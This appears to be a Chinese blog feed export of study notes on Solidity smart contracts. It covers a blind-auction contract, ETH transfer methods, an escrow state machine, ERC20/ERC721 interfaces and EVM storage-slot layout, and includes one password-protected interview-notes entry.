对于所有正确披露的无效出价以及除最高出价以外的所有出价，你都将获得退款。</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reveal</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">uint</span>[] _values,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">bool</span>[] _fake,</span></span></span><br><span class="line"><span class="function"><span class="params">        bytes32[] _secret</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">onlyAfter</span><span class="params">(biddingEnd)</span></span></span><br><span class="line"><span class="function">        <span class="title">onlyBefore</span><span class="params">(revealEnd)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">uint</span> length = bids[msg.sender].length;</span><br><span class="line">        <span class="keyword">require</span>(_values.length == length);</span><br><span class="line">        <span class="keyword">require</span>(_fake.length == length);</span><br><span class="line">        <span class="keyword">require</span>(_secret.length == length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint</span> refund;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">uint</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            Bid storage bid = bids[msg.sender][i];</span><br><span class="line">            (<span class="keyword">uint</span> value, <span class="keyword">bool</span> fake, bytes32 secret) =</span><br><span class="line">                    (_values[i], _fake[i], _secret[i]);</span><br><span class="line">            <span class="keyword">if</span> (bid.blindedBid != keccak256(value, fake, secret)) &#123;</span><br><span class="line">                <span class="comment">// 出价未能正确披露</span></span><br><span class="line">                <span class="comment">// 不返还订金</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            refund += bid.deposit;</span><br><span class="line">            <span class="keyword">if</span> (!fake &amp;&amp; bid.deposit &gt;= value) &#123;</span><br><span class="line">                <span class="keyword">if</span> (placeBid(msg.sender, value))</span><br><span class="line">                    refund -= value;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 使发送者不可能再次认领同一笔订金</span></span><br><span class="line">            bid.blindedBid = bytes32(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        msg.sender.transfer(refund);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是一个 &quot;internal&quot; 函数， 意味着它只能在本合约（或继承合约）内被调用</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">placeBid</span><span class="params">(address bidder, <span class="keyword">uint</span> value)</span> <span class="title">internal</span></span></span><br><span class="line"><span class="function">            <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt;= highestBid) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (highestBidder != address(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">// 返还之前的最高出价</span></span><br><span class="line">            pendingReturns[highestBidder] += highestBid;</span><br><span class="line">        &#125;</span><br><span class="line">        highestBid = value;</span><br><span class="line">        highestBidder = bidder;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 取回出价（当该出价已被超越）</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span><span class="params">()</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="keyword">uint</span> amount = pendingReturns[msg.sender];</span><br><span class="line">        <span class="keyword">if</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 这里很重要，首先要设零值。</span></span><br><span class="line">            <span class="comment">// 因为，作为接收调用的一部分，</span></span><br><span class="line">            <span class="comment">// 接收者可以在 `transfer` 返回之前重新调用该函数。（可查看上面关于‘条件 -&gt; 影响 -&gt; 交互’的标注）</span></span><br><span class="line">            pendingReturns[msg.sender] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            msg.sender.transfer(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 结束拍卖，并把最高的出价发送给受益人</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">auctionEnd</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">onlyAfter</span><span class="params">(revealEnd)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(!ended);</span><br><span class="line">        emit AuctionEnded(highestBidder, highestBid);</span><br><span class="line">        ended = <span class="keyword">true</span>;</span><br><span class="line">        beneficiary.transfer(highestBid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><a href="https://www.jianshu.com/p/9bfe756410d9">代码分析</a></p>
<p>由于区块链上面的交易都是公开透明的，前面的拍卖合约可以通过查询每一笔交易轻易得知目前的最高价。要实现盲拍确实困难。上述合约通过引入伪出价，使得真实的出价被隐藏在众多交易中，并且通过keccak256校验防止竞拍者修改自己的出价记录。实现一定程度上的盲拍。</p>
<h4 id="1-转账函数"><a href="#1-转账函数" class="headerlink" title="1.转账函数"></a>1.转账函数</h4><h5 id="transfer"><a href="#transfer" class="headerlink" title="\.transfer()"></a>\<address>.transfer()</address></h5><p><code>address.transfer()</code>方法相当于 <code>require(address.send())</code>, 使用<code>transfer</code>方法也需要注意两点，第一点，跟<code>send</code>方法一样，<code>transfer</code>也只提供了2300 Energy。 第二点，不同于<code>send</code>方法，<code>transfer</code>方法提供了一种更安全的机制，失败的时候会抛出异常，所有已经完成的操作都会回滚。</p>
<h5 id="send"><a href="#send" class="headerlink" title="\.send()"></a>\<address>.send()</address></h5><p>使用<code>address.send()</code>方法需要注意两点，第一点，如上所述，它只提供了2300 Energy。 第二点，对于执行失败的<code>send</code>方法，<code>send</code>函数仅仅返回<code>false</code>，不会抛出任何异常。因此调用<code>send</code>方法的时候需要配合<code>require</code>使用，否则可能会出现交易上链，用户支付了fee，但是所有的状态改动没有生效。</p>
<h5 id="call-value"><a href="#call-value" class="headerlink" title="\.call.value()"></a>\<address>.call.value()</address></h5><p>相对于前两种方法，<code>address.call.value(amount)( )</code>使用起来更加灵活，适用的范围也更加广泛。因为这种方式提供了指定energy数量的接口，使用的时候不再受2300 Energy的限制，可以允许接收函数执行更复杂的操作。使用这种方法也需要注意两点问题。第一个，同<code>send()</code>一样，执行失败的时候此函数不会抛出异常，只返回<code>false</code>，需要用户手动处理返回结果，使用的时候建议配合<code>require</code>一起使用。第二点，如果不显示指定Energy数量，默认的Energy数量是用户所有可用的Energy。Energy数量可以通过修饰器 <code>.gas(energyLimit)</code>来设定。</p>
<h4 id="2-构造函数"><a href="#2-构造函数" class="headerlink" title="2.构造函数"></a>2.构造函数</h4><p>solidity 的内置变量 <code>now</code> 将返回当前的unix时间戳（自1970年1月1日以来经过的秒数）。在这里，以秒为单位，因此 <code>_biddingTime</code>, <code>_revealTime</code> 都是从当前开始经过XXX秒后</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">constructor(</span><br><span class="line">    uint _biddingTime,</span><br><span class="line">    uint _revealTime,</span><br><span class="line">    address payable _beneficiary</span><br><span class="line">) <span class="keyword">public</span> &#123;</span><br><span class="line">    beneficiary = _beneficiary;</span><br><span class="line">    biddingEnd = now + _biddingTime;</span><br><span class="line">    revealEnd = biddingEnd + _revealTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="3-constructor"><a href="#3-constructor" class="headerlink" title="3. constructor"></a>3. constructor</h4><p>构造函数是使用 <code>constructor</code> 关键字声明的一个可选函数, 它在创建合约时执行, 可以在其中运行合约初始化代码。如果没有构造函数, 合约将假定采用默认构造函数, 它等效于 <code>constructor() &#123;&#125;</code> 。</p>
<p>在执行构造函数代码之前, 如果状态变量可以初始化为指定值; 如果不初始化, 则为零。</p>
<p>在 0.7.0 版本之前, 你需要通过 <code>internal</code> 或 <code>public</code> 指定构造函数的可见性。</p>
<h3 id="状态机"><a href="#状态机" class="headerlink" title="状态机"></a>状态机</h3><p>此处代码未采用书上的例子，转自一篇<a href="https://my.oschina.net/u/4327212/blog/4504765">文章</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">uint <span class="keyword">public</span> value;<span class="comment">//定义商品的价值</span></span><br><span class="line">    address payable <span class="keyword">public</span> seller;<span class="comment">//定义一个payable类型的卖方</span></span><br><span class="line">    address payable <span class="keyword">public</span> buyer;<span class="comment">//定义一个payable类型的买方</span></span><br><span class="line">    </span><br><span class="line">    enum State &#123; Created, Locked, Release, Inactive &#125;</span><br><span class="line">    <span class="comment">//定义一个枚举类型包含四个状态变量</span></span><br><span class="line">    State <span class="keyword">public</span> state;<span class="comment">//定义枚举变量</span></span><br><span class="line">    </span><br><span class="line">    modifier condition(<span class="keyword">bool</span> _condition)&#123;</span><br><span class="line">        <span class="keyword">require</span>(_condition);</span><br><span class="line">        _;</span><br><span class="line">    &#125;<span class="comment">//判断是否bool型变量condition是否为true</span></span><br><span class="line">    </span><br><span class="line">    modifier onlyBuyer()&#123;</span><br><span class="line">        <span class="keyword">require</span>(</span><br><span class="line">            msg.sender == buyer,</span><br><span class="line">            <span class="string">&quot;Only buyer can call this.&quot;</span></span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;<span class="comment">//判断调用地址是否为买方地址</span></span><br><span class="line">    </span><br><span class="line">    modifier onlySeller()&#123;</span><br><span class="line">        <span class="keyword">require</span>(</span><br><span class="line">            msg.sender == seller,</span><br><span class="line">            <span class="string">&quot;Only seller can call this.&quot;</span></span><br><span class="line">            );</span><br><span class="line">            _;</span><br><span class="line">    &#125;<span class="comment">//判断调用地址是否为卖方地址</span></span><br><span class="line">    </span><br><span class="line">    modifier inState(State _state) &#123;</span><br><span class="line">        <span class="keyword">require</span>(</span><br><span class="line">            state == _state,</span><br><span class="line">            <span class="string">&quot;Invalid state.&quot;</span></span><br><span class="line">            );</span><br><span class="line">            _;</span><br><span class="line">    &#125;<span class="comment">//判断是否在对应的交易阶段调用对应的函数</span></span><br><span class="line"> <span class="comment">//以下是四个阶段通知的声明，方便后续可以通过log日志获取详细信息</span></span><br><span class="line">    event Aborted();</span><br><span class="line">    event PurchaseConfirmed();</span><br><span class="line">    event ItemReceived();</span><br><span class="line">    event SellerRefunded();</span><br><span class="line">    <span class="comment">//撤回函数</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">abort</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">onlySeller</span>//调用地址为卖方地址才可运行该函数</span></span><br><span class="line"><span class="function">    <span class="title">inState</span>(<span class="params">State.Created</span>)//当状态处于合约产生状态时可调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        emit Aborted();<span class="comment">//调用log日志显示</span></span><br><span class="line">        state = State.Inactive;<span class="comment">//状态转为不工作状态</span></span><br><span class="line">        seller.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//买家确认购买函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">confirmPurchase</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">inState</span>(<span class="params">State.Created</span>)//处于合约产生阶段可调用</span></span><br><span class="line"><span class="function">    <span class="title">condition</span>(<span class="params">msg.value == (<span class="params"> <span class="number">2</span> * value</span>)</span>)//购买人的输入<span class="title">value</span>必须持有2*<span class="title">value</span></span></span><br><span class="line"><span class="function">    <span class="title">payable</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        emit PurchaseConfirmed();</span><br><span class="line">        buyer = msg.sender;<span class="comment">//对买方地址进行赋值</span></span><br><span class="line">        state = State.Locked;<span class="comment">//状态切换为锁定订单</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//买家确认收获函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">confirmReceived</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">onlyBuyer</span>//限制买家进行调用</span></span><br><span class="line"><span class="function">    <span class="title">inState</span>(<span class="params">State.Locked</span>)//处于合约锁定阶段可以调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        emit ItemReceived();</span><br><span class="line">        state = State.Release;<span class="comment">//转换为合约发布阶段</span></span><br><span class="line">        buyer.transfer(value);<span class="comment">//买方退回value</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//卖方收回资金函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">refundSeller</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">onlySeller</span>//只有卖方能够调用</span></span><br><span class="line"><span class="function">    <span class="title">inState</span>(<span class="params">State.Release</span>)//状态是合约锁定解除可调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        emit SellerRefunded();</span><br><span class="line">        state = State.Inactive;<span class="comment">//状态切换为合约不工作</span></span><br><span class="line">        seller.transfer(<span class="number">3</span> * value);<span class="comment">//返回3*value给卖家</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="debug调试"><a href="#debug调试" class="headerlink" title="debug调试"></a>debug调试</h4><p>对state的初始值有所疑问，所以进行了调试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">State</span> </span>&#123; Created, Locked, Release, Inactive &#125;</span><br><span class="line">    State <span class="keyword">public</span> state;</span><br></pre></td></tr></table></figure>
<p>采取remix在线部署后调试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line">contract tAest &#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">State</span> </span>&#123; Created, Locked, Release, Inactive &#125;</span><br><span class="line">    State <span class="keyword">public</span> state;</span><br><span class="line">    <span class="function">function <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         state=State.Locked;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/21/13/image-20210321220444930-7092544.png" alt="image-20210321220444930"></p>
<p>点击Debug进入调试，</p>
<p><img src="/2021/03/21/13/image-20210321220545250-7092544.png" alt="image-20210321220545250"></p>
<p>简单说明</p>
<p><img src="/2021/03/21/13/image-20210321220715904-7092544.png" alt="image-20210321220715904"></p>
<p>执行到最后也不会执行a函数，这是因为我们没有调用</p>
<p>回到部署的界面，点击一下a，会出现新的debug按钮，再点进去</p>
<p><img src="/2021/03/21/13/image-20210321220931862-7092544.png" alt="image-20210321220931862"></p>
<p>继续单步执行到一个pop指令后，<code>state</code> 的值会改变为Locked</p>
<p><img src="/2021/03/21/13/image-20210321221038692-7092544.png" alt="image-20210321221038692"></p>
<p>如果在外面直接改变state会报错。这是因为solidity语法在变量声明时只能进行一次赋值或者初始化为默认值</p>
<p><img src="/2021/03/21/13/image-20210321221346793-1616336155318-7092544.png" alt="image-20210321221346793"></p>
<h4 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h4><p>本块内容其实在上面的合约中有所体现，采取白名单策略，同时编写设置白名单的函数，可以实现对用户的权限控制。</p>
<h2 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h2><h3 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h3><p>它诞生于2015年，到2017年9月被正式标准化。协议规定了具有可互换性（fungible）代币的一组基本接口，包括代币符号、发行量、转账、授权等</p>
<p><img src="/2021/03/21/13/image-20210322185706847-7092544.png" alt="image-20210322185706847"></p>
<h4 id="接口定义"><a href="#接口定义" class="headerlink" title="接口定义"></a>接口定义</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract ERC20 &#123;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">string name</span>)</span></span><br><span class="line"><span class="function">      <span class="function"><span class="keyword">function</span> <span class="title">symbol</span>(<span class="params"></span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">string symbol</span>)</span></span></span><br><span class="line"><span class="function"><span class="function">      <span class="function"><span class="keyword">function</span> <span class="title">decimals</span>(<span class="params"></span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint8 decimals</span>)</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">      <span class="function"><span class="keyword">function</span> <span class="title">totalSupply</span>(<span class="params"></span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint totalSupply</span>)</span>;</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">      <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint balance</span>)</span>;</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">      <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>)</span>;</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">      <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address _from, address _to, uint _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>)</span>;</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">      <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address _spender, uint _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>)</span>;</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">      <span class="function"><span class="keyword">function</span> <span class="title">allowance</span>(<span class="params">address _owner, address _spender</span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint remaining</span>)</span>;</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">      <span class="title">event</span> <span class="title">Transfer</span>(<span class="params">address indexed _from, address indexed _to, uint _value</span>)</span>;</span></span></span><br><span class="line"><span class="function"><span class="function">      <span class="title">event</span> <span class="title">Approval</span>(<span class="params">address indexed _owner, address indexed _spender, uint _value</span>)</span>;</span></span><br><span class="line"><span class="function">    &#125;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>name：代币名字</li>
<li>symbol：代币简称</li>
<li>decimals：token使用小数点，</li>
<li>totalSupply：token供应总量</li>
<li>balanceOf：某个地址（账户）的余额</li>
<li>transfer：从代币合约的调用者地址上转移_value的数量token到的地址_to，并且必须触发Transfer事件</li>
<li>transferFrom：从地址_from发送数量为_value的token到地址_to,必须触发Transfer事件。transferFrom方法用于允许合同代理某人转移token。条件是from账户必须经过了approve。</li>
<li>approve：允许_spender多次取回您的帐户，最高达_value金额。 如果再次调用此函数，它将以_value覆盖当前的余量。</li>
<li>allowance：返回_spender仍然被允许从_owner提取的金额。</li>
<li>Transfer：当成功转移token时，一定要触发Transfer事件</li>
<li>Approval：当调用approval函数成功时，一定要触发Approval事件</li>
</ul>
<p>理解后三个函数：如果账户A有1000个ETH，想允许B账户随意调用他的100个ETH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. A账户按照以下形式调用approve函数approve(B,100)  </span><br><span class="line">2. B账户想用这100个ETH中的10个ETH给C账户，调用transferFrom(A, C, 10)  </span><br><span class="line">3. 调用allowance(A, B)可以查看B账户还能够调用A账户多少个token  </span><br></pre></td></tr></table></figure>
<p><a href="https://gitee.com/ethergo/ether-erc20-token">部署自己的ERC20代币</a></p>
<h3 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h3><p>ERC 721 合约标准规定了一种不可替代的代币 Non-fungible Token, NFT ）的合约接 此类代币的最小单位为个，即在 ERC 20 标准中对应小数点位的 decimal 值为零</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">contract ERC721 &#123; </span><br><span class="line"><span class="comment">// Required method </span></span><br><span class="line">    <span class="function">function <span class="title">totalSupply</span><span class="params">()</span> constant <span class="title">returns</span> <span class="params">(uint256 totalSupply)</span></span>; </span><br><span class="line">    <span class="function">function <span class="title">balanceOf</span><span class="params">(address owner)</span> constant <span class="title">returns</span> <span class="params">(uint256 balance)</span></span>; </span><br><span class="line">    <span class="function">function <span class="title">owner0f</span><span class="params">(uint256 tokenid)</span> constant <span class="title">returns</span> <span class="params">(address owner)</span></span>; </span><br><span class="line">    <span class="function">function <span class="title">approve</span><span class="params">(address _to, uint256 _tokenid)</span></span>; </span><br><span class="line">    <span class="function">function <span class="title">takeOwnership</span><span class="params">(uint256 tokenid)</span></span>; </span><br><span class="line">    <span class="function">function <span class="title">transfer</span><span class="params">(address to, uint256 tokenid)</span></span>; </span><br><span class="line"><span class="comment">// Optional method </span></span><br><span class="line">    <span class="function">function <span class="title">name</span><span class="params">()</span> constant <span class="title">returns</span> <span class="params">(string name)</span></span>;</span><br><span class="line">    <span class="function">function <span class="title">symbol</span><span class="params">()</span> constant <span class="title">returns</span> <span class="params">(string symbol)</span></span>; </span><br><span class="line">    <span class="function">function <span class="title">tokenOfOwnerByindex</span><span class="params">(address owner, uint256 index)</span> constant returns </span></span><br><span class="line"><span class="function"><span class="params">(uint tokenid)</span></span>; </span><br><span class="line">    <span class="function">function <span class="title">tokenMetadata</span><span class="params">(uint256 tokenid)</span> constant <span class="title">returns</span> <span class="params">(string infoUrl)</span></span>; </span><br><span class="line"><span class="comment">//Events </span></span><br><span class="line">    <span class="function">event <span class="title">Transfer</span><span class="params">(address indexed _from, address indexed _to, uint256 _tokenid)</span></span>; </span><br><span class="line">    <span class="function">event <span class="title">Approval</span><span class="params">(address indexed owner, address indexed _approved, uint256 tokenid)</span></span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出ERC721继承了ERC20标准的一些基本功能接口。同时加入一些新的功能函数</p>
<ul>
<li>owner0f：根据代币ID查询该代币持有者</li>
<li>tokenOfOwnerByindex：根据持有者及其索引查询所持有的代币ID</li>
<li>takeOwnership：与ERC20中的transferFrom一样</li>
<li>tokenMetadata：用于查看代币的元数据</li>
</ul>
<p>ERC721代表作CryptoKitties以太坊养猫</p>
<h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><p>本章主要是工具介绍和以太坊浏览器的使用</p>
<h2 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h2><p>以太坊性能优化</p>
<h2 id="第十章"><a href="#第十章" class="headerlink" title="第十章"></a>第十章</h2><p>以太坊隐私保护</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链面试总结</title>
    <url>/2021/06/30/18/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f215ce61e497aafe5a8bd2ccd4488636ea1577e455510d5d41d0a395d9b4f905"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约变量储存机制详解</title>
    <url>/2021/07/09/19/</url>
    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>最近在研究以太坊存储机制，写一篇文章总结一下</p>
<p>文章首发<a href="https://xz.aliyun.com/t/9837">先知社区</a></p>
<h1 id="0x02-存储机制"><a href="#0x02-存储机制" class="headerlink" title="0x02 存储机制"></a>0x02 存储机制</h1><p>每个在以太坊虚拟机（EVM）中运行的智能合约的状态都在链上永久地存储着。这些值存储在一个巨大的数组中，数组的长度为2^256，下标从零开始且每一个数组能够储存32字节(256个比特)长度的值。并且存储是稀疏的，并没有那么密集。</p>
<h1 id="0x03-变量类型"><a href="#0x03-变量类型" class="headerlink" title="0x03 变量类型"></a>0x03 变量类型</h1><p>Solidity的数据变量类型分为两类</p>
<ul>
<li>值类型-value type</li>
<li>引用类型-reference type</li>
</ul>
<p>下面列举常用的变量类型</p>
<h2 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h2><ul>
<li>布尔型(bool) 2bit(0/1)</li>
<li>整型(int/uint)  根据关键字的不同表示不同长度，int8表示8bits有符号数</li>
<li>定长浮点型(fixed/ufixed) Solidity 还没有完全支持定长浮点型。可以声明定长浮点型的变量，但不能给它们赋值或把它们赋值给其他变量</li>
<li>地址类型(adress) 160bits</li>
<li>地址类型成员变量(balance,transfer….)  <ul>
<li>.balance  uint256(256bits)</li>
<li>transfer()  uint256(256bits)</li>
</ul>
</li>
<li>定长字节数组(byte[1]/bytes[1]) 定义数组时定义长度</li>
</ul>
<h2 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h2><ul>
<li><p>不定长字节数组类型(bytes[]/byte[],string,uint[]….)</p>
</li>
<li><p>结构体(struct)</p>
</li>
<li>映射(mapping)</li>
</ul>
<h1 id="0x04-简单分析"><a href="#0x04-简单分析" class="headerlink" title="0x04 简单分析"></a>0x04 简单分析</h1><p>写一个简单值类型的合约</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line">    bool a=<span class="literal">false</span>;</span><br><span class="line">    bool b=<span class="literal">true</span>;</span><br><span class="line">    int16 c=<span class="number">32767</span>;</span><br><span class="line">    uint16 d=<span class="number">0x32</span>;</span><br><span class="line">    byte e=<span class="number">10</span>;</span><br><span class="line">    bytes1 f=<span class="number">11</span>;</span><br><span class="line">    bytes2 g=<span class="number">22</span>;</span><br><span class="line">    uint h=<span class="number">0x1</span>; <span class="comment">//uint是uint256的简称</span></span><br><span class="line">    address i=<span class="number">0xbc6581e11c216B17aDf5192E209a7F95a49e6837</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>优化存储原则：如果下一个变量长度和上一个变量长度加起来不超过256bits，它们就会存储在同一个插槽里</p>
<p><img src="/2021/07/09/19/image-20210707162324839.png" alt></p>
<p>根据<a href="https://ropsten.etherscan.io/tx/0xf9c22d427b6fdd2e3f29346104fd2f2b1badd318e86debea444adcdba37f821d#statechange">交易查询</a>到的存储在以太坊虚拟机上面的值，下面进行分析</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000160b0a00327fff0100</span> slot0</span><br><span class="line"><span class="comment">//0x00 a false</span></span><br><span class="line"><span class="comment">//0x01 b true</span></span><br><span class="line"><span class="comment">//0x7fff c 32767</span></span><br><span class="line"><span class="comment">//0x0032 d 0x32</span></span><br><span class="line"><span class="comment">//0x0a e 10</span></span><br><span class="line"><span class="comment">//0x0b f 11</span></span><br><span class="line"><span class="comment">//0x0016 g 22</span></span><br><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000000000000001</span> slot1</span><br><span class="line"><span class="comment">// h 0x1</span></span><br><span class="line"><span class="number">0x000000000000000000000000bc6581e11c216b17adf5192e209a7f95a49e6837</span> slot2</span><br><span class="line"><span class="comment">// i 0x2</span></span><br></pre></td></tr></table></figure>
<p>从上面可以看出</p>
<ul>
<li>各个类型的存储长度</li>
<li>存储顺序从后往前</li>
<li>存储优化原则</li>
<li>byte.length==bytes1.length==8bits</li>
</ul>
<h1 id="0x05-数组类型"><a href="#0x05-数组类型" class="headerlink" title="0x05 数组类型"></a>0x05 数组类型</h1><h2 id="定长数组"><a href="#定长数组" class="headerlink" title="定长数组"></a>定长数组</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract TEST&#123;</span><br><span class="line"></span><br><span class="line">    bytes8[<span class="number">5</span>] a = [byte(<span class="number">0x6a</span>),<span class="number">0x68</span>,<span class="number">0x79</span>,<span class="number">0x75</span>];</span><br><span class="line">    bool b=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/09/19/image-20210707202744781.png" alt="image-20210707202744781"></p>
<p>可以看的我虽然规定了了长度为5，但是实际上只用了4个，所以就只是用了四个bytes8的空间</p>
<p>是不是可以加一个，编译器会报错</p>
<p><img src="/2021/07/09/19/image-20210707203030190.png" alt="image-20210707203030190"></p>
